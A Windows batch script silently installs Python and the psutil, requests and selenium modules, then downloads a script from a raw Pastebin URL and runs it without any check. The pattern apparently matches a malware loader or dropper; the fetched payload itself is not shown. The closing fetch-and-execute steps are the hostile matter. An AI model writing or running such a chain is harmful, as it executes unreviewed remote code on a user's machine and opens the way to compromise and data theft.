@echo off

:: Step 1: Download Python installer
echo Downloading Python installer...
curl -o python-installer.exe https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe

:: Step 2: Install Python silently for current user
echo Installing Python silently for the current user...
python-installer.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0

:: Step 3: Verify Python installation
echo Verifying Python installation...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python installation failed. Exiting...
    pause
    exit /b 1
)

:: Step 4: Upgrade pip
echo Upgrading pip...
python -m pip install --upgrade pip

:: Step 5: Install specific Python modules
echo Installing required Python modules...
python -m pip install psutil requests selenium

:: Step 6: Download Python script from Pastebin
echo Downloading Python script...
curl -o script.py https://pastebin.com/raw/6yTgLNqf

:: Step 7: Run the Python script
echo Running the downloaded Python script...
python script.py

echo Done!
pause
